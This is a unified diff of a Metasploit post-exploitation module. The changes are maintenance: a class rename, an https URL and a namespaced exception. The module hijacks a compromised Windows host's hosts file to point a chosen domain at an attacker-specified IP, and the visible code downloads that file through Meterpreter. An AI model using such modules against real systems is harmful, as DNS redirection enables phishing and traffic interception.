@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
@@ -24,7 +22,7 @@ class Metasploit3 < Msf::Post
       [
         OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),
         OptString.new('IP', [ true, 'IP address to point domain name to.' ])
-      ], self.class)
+      ])
   end
 
 
@@ -45,7 +43,7 @@ class Metasploit3 < Msf::Post
     begin
       # Download the remote file to the temporary file
       client.fs.file.download_file(temp_path, 'C:\\WINDOWS\\System32\\drivers\\etc\\hosts')
-    rescue RequestError => re
+    rescue Rex::Post::Meterpreter::RequestError => re
       # If the file doesn't exist, then it's okay.  Otherwise, throw the
       # error.
       if re.result != 2
